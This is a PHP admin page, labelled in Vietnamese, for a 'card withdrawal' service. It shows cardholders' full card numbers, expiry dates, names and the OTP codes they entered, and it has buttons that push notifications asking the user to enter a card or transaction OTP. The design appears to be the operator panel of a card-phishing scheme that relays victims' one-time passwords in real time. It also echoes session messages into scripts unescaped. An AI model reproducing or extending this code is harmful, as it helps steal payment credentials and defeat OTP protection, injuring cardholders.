<?php
include '../../component/header.php';
include '../../component/formatCardNumber.php';
include '../../component/formatSecutiry.php';
include '../../component/formatAmount.php';

if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    header("Location: /no-permission");
    exit();
}

function getStatusText($status)
{
    switch ($status) {
        case '0':
            return 'init';
        case '1':
            return 'thành công';
        case '2':
            return 'thất bại';
        case '3':
            return 'xác thực otp thẻ';
        case '4':
            return 'xác thực otp giao dịch';
        default:
            return 'Không xác định';
    }
}

$id_history = isset($_GET['id_history']) ? $_GET['id_history'] : null;
if (!$id_history) {
    echo "Không tìm thấy yêu cầu.";
    exit();
}

$query = "SELECT h.*, c.card_number, c.expDate, c.firstName, c.lastName 
          FROM tbl_history h 
          JOIN tbl_card c ON h.id_card = c.id_card 
          WHERE h.id_history = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $id_history);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 0) {
    echo "Không tìm thấy yêu cầu.";
    exit();
}

$transaction = $result->fetch_assoc();

$formattedCardNumber = formatCardNumber($transaction['card_number']);
$statusText = getStatusText($transaction['status']);
$amountFormat = formatAmount($transaction['amount']);
$token_user = $transaction['token_user'];

$token_admin = isset($_SESSION['token_admin']) ? $_SESSION['token_admin'] : '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    $status = '';
    $reason = '';

    if ($action === 'approve') {
        $status = '1';
    } elseif ($action === 'decline') {
        $status = '2';
        $reason = isset($_POST['reason']) ? $_POST['reason'] : '';
    } elseif ($action === 'otp_card') {
        $status = '3'; // Cập nhật trạng thái cho Xác thực OTP Thẻ

    } elseif ($action === 'otp_transaction') {
        $status = '4'; // Cập nhật trạng thái cho Xác thực OTP Giao Dịch

    }

    $queryHistory = "UPDATE tbl_history SET status = ?, reason = ?, token_admin = ? WHERE id_history = ?";
    $stmtHistory = $conn->prepare($queryHistory);
    $stmtHistory->bind_param("sssi", $status, $reason, $token_admin, $id_history);

    if ($stmtHistory->execute()) {
        if ($action === 'approve') {
            $queryHistoryInfo = "SELECT user_id, amount FROM tbl_history WHERE id_history = ?";
            $stmtHistoryInfo = $conn->prepare($queryHistoryInfo);
            $stmtHistoryInfo->bind_param("i", $id_history);
            $stmtHistoryInfo->execute();
            $stmtHistoryInfo->bind_result($user_id, $amount);
            $stmtHistoryInfo->fetch();
            $stmtHistoryInfo->close();

            // Lấy số dư hiện tại của người dùng
            $queryUserBalance = "SELECT balance FROM users WHERE id = ?";
            $stmtUserBalance = $conn->prepare($queryUserBalance);
            $stmtUserBalance->bind_param("i", $user_id);
            $stmtUserBalance->execute();
            $stmtUserBalance->bind_result($current_balance);
            $stmtUserBalance->fetch();
            $stmtUserBalance->close();

            // Cập nhật số dư của người dùng
            $new_balance = $current_balance + $amount;
            $queryUpdateBalance = "UPDATE users SET balance = ? WHERE id = ?";
            $stmtUpdateBalance = $conn->prepare($queryUpdateBalance);
            $stmtUpdateBalance->bind_param("di", $new_balance, $user_id);
            $stmtUpdateBalance->execute();
            $stmtUpdateBalance->close();

            // Lưu thông tin biến động số dư vào bảng tbl_history_balance
            $history_balance_query = "INSERT INTO tbl_history_balance (balance_before, balance_after, balance_fluctuation, user_id, id_history, transaction_date) VALUES (?, ?, ?, ?, ?, NOW())";
            $stmtHistoryBalance = $conn->prepare($history_balance_query);
            $stmtHistoryBalance->bind_param('ddiii', $current_balance, $new_balance, $amount, $user_id, $id_history);
            $stmtHistoryBalance->execute();
            $stmtHistoryBalance->close();
        }

        // $_SESSION['card_success'] = ($action === 'approve') ? "Chấp nhận yêu cầu rút tiền thành công." : "Từ chối yêu cầu rút tiền thành công.";
        switch ($action) {
            case 'approve':
                $_SESSION['card_success'] = "Chấp nhận yêu cầu rút tiền thành công.";
                break;
            case 'decline':
                $_SESSION['card_success'] = "Từ chối yêu cầu rút tiền thành công.";
                break;
            case 'otp_card':
                $_SESSION['card_success'] = "Yêu cầu xác thực OTP thẻ thành công.";
                break;
            case 'otp_transaction':
                $_SESSION['card_success'] = "Yêu cầu xác thực OTP giao dịch thành công.";
                break;
            default:
                $_SESSION['card_error'] = "Hành động không xác định.";
                break;
        }
        header('Location: /admin/manager-card-withdraw');
        exit();
    } else {
        $_SESSION['card_error'] = "Đã xảy ra lỗi khi cập nhật trạng thái yêu cầu rút tiền.";
    }

    $stmtHistory->close();
    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../styles/index.css">
    <link rel="stylesheet" href="../../component/header.css">
    <link rel="stylesheet" href="../../component/sidebar.css">
    <link rel="stylesheet" href="./card_detail.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <title>Chi tiết yêu cầu rút tiền</title>
</head>

<body>
    <div class="container_boby">
        <?php include '../../component/sidebar.php'; ?>
        <div class="content_right container_form">
            <div class="container">
                <h1 class="title">Chi tiết yêu cầu rút tiền</h1>
                <form method="post" action="">
                    <div class="form-group">
                        <label for="firstName">Tên Chủ Tài Khoản:</label>
                        <input type="text" id="firstName"
                            value="<?php echo htmlspecialchars($transaction['firstName']); ?>" disabled>
                    </div>
                    <div class="form-group">
                        <label for="lastName">Họ Chủ Tài Khoản:</label>
                        <input type="text" id="lastName"
                            value="<?php echo htmlspecialchars($transaction['lastName']); ?>" disabled>
                    </div>
                    <div class="form-group">
                        <label for="cardNumber">Số Thẻ:</label>
                        <input type="text" id="cardNumber" value="<?php echo htmlspecialchars($formattedCardNumber); ?>"
                            disabled>
                    </div>
                    <div class="form-group">
                        <label for="transaction_date">Ngày giao dịch:</label>
                        <input type="text" id="transaction_date"
                            value="<?php echo htmlspecialchars($transaction['transaction_date']); ?>" disabled>
                    </div>
                    <div class="form-group">
                        <label for="expDate">Ngày Hết Hạn:</label>
                        <input type="text" id="expDate" value="<?php echo htmlspecialchars($transaction['expDate']); ?>"
                            disabled>
                    </div>
                    <div class="form-group">
                        <label for="amount">Số tiền muốn rút:</label>
                        <input type="text" id="amount" value="<?php echo htmlspecialchars($amountFormat); ?>" disabled>
                    </div>
                    <div class="form-group">
                        <label for="otp_card">Mã OTP xác thực thẻ:</label>
                        <input type="text" id="otp_card"
                            value="<?php echo htmlspecialchars($transaction['otp_card']); ?>" disabled>
                    </div>
                    <div class="form-group">
                        <label for="otp_transaction">Mã OTP xác thực giao dịch:</label>
                        <input type="text" id="otp_transaction"
                            value="<?php echo htmlspecialchars($transaction['otp_transaction']); ?>" disabled>
                    </div>
                    <div class="form-group">
                        <label for="status">Trạng Thái:</label>
                        <input type="text" id="status" value="<?php echo htmlspecialchars($statusText); ?>" disabled>
                    </div>
                    <?php if ($transaction['status'] === '2'): ?>
                        <div class="form-group">
                            <label for="status">Lí do thất bại:</label>
                            <input type="text" id="status" value="<?php echo htmlspecialchars($transaction['reason']); ?>"
                                disabled>
                        </div>
                    <?php endif; ?>
                    <div class="form-group reason-group" id="reasonGroup" style="display: none;">
                        <label for="reason">Lý Do Từ Chối:</label>
                        <textarea id="reason" name="reason"></textarea>
                    </div>
                    <div class="form-actions" style="display: flex;">
                        <?php if ($transaction['status'] !== '1' && $transaction['status'] !== '2'): ?>
                            <button type="submit" name="action" value="approve" class="btn-accept">Chấp Nhận</button>
                            <button type="button" id="decliceButton" class="btn-decline" onclick="showReason()">Từ
                                Chối</button>
                            <button style="margin-left: 10px; display: none;" type="submit" name="action" value="decline"
                                class="btn-decline" id="confirmButton">Xác Nhận Từ Chối</button>
                            <!-- Thêm nút Xác thực OTP Thẻ -->
                            <button type="submit" id="otpCardButton" name="action" value="otp_card" class="btn-otp-card"
                                style="margin-left: 10px;">Xác thực OTP Thẻ</button>
                            <!-- Thêm nút Xác thực OTP Giao Dịch -->
                            <button type="submit" id="otpTransactionButton" name="action" value="otp_transaction"
                                class="btn-otp-transaction" style="margin-left: 10px;">Xác thực OTP Giao Dịch</button>
                        <?php endif; ?>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

<script>
    document.getElementById('otpCardButton').addEventListener('click', function () {
        fetch('../../component/send.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({
                'token': '<?php echo htmlspecialchars($token_user); ?>', // Sử dụng token từ bảng history
                'title': 'Thông báo từ admin',
                'body': JSON.stringify({
                    'type': '0',
                    'message': 'Admin yêu cầu bạn nhập mã OTP thẻ, hãy vào kiểm tra',
                    'id_history': '<?php echo htmlspecialchars($id_history); ?>' // Truyền id_history vào đây
                }),
                'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
            })
        })
            .then(response => response.text())
            .then(data => {
                console.log('Success:', data);
                toastr.success('Thông báo đã được gửi thành công.');
            })
            .catch((error) => {
                console.error('Error:', error);
                toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
            });
    });

    document.getElementById('otpTransactionButton').addEventListener('click', function () {
        fetch('../../component/send.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({
                'token': '<?php echo htmlspecialchars($token_user); ?>', // Sử dụng token từ bảng history
                'title': 'Thông báo từ admin',
                'body': JSON.stringify({
                    'type': '1',
                    'message': 'Admin yêu cầu bạn nhập mã OTP giao dịch, hãy vào kiểm tra',
                    'id_history': '<?php echo htmlspecialchars($id_history); ?>' // Truyền id_history vào đây
                }),
                'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
            })
        })
            .then(response => response.text())
            .then(data => {
                console.log('Success:', data);
                toastr.success('Thông báo đã được gửi thành công.');
            })
            .catch((error) => {
                console.error('Error:', error);
                toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
            });
    });


</script>
<script>
    $(document).ready(function () {
        <?php if (isset($_SESSION['otp_card_error'])): ?>
            toastr.error("<?php echo $_SESSION['otp_card_error']; ?>");
            <?php unset($_SESSION['otp_card_error']); ?>
        <?php endif; ?>
    });
</script>
<script>
    function showReason() {
        document.getElementById("reasonGroup").style.display = "block";
        document.getElementById("confirmButton").style.display = "block";
        document.getElementById("decliceButton").style.display = "none";
    }

    <?php if (isset($_SESSION['card_error'])): ?>
        toastr.error('<?php echo $_SESSION['card_error']; ?>');
        <?php unset($_SESSION['card_error']); ?>
    <?php endif; ?>

    <?php if (isset($_SESSION['card_success'])): ?>
        toastr.success('<?php echo $_SESSION['card_success']; ?>');
        <?php unset($_SESSION['card_success']); ?>
    <?php endif; ?>
</script>
<script type="module">
    import { handleOnMessage } from '/component/firebaseMessaging.js';
    // Gọi hàm và truyền callback để xử lý thông báo
    handleOnMessage((payload) => {
        const notificationTitle = payload.notification.title || "Firebase Notification";
        const notificationBody = payload.notification.body || "You have a new message.";

        // Hiển thị thông báo qua alert hoặc bất kỳ UI nào bạn muốn
        alert(`${notificationTitle}: ${notificationBody}`);
    });
</script>

</html>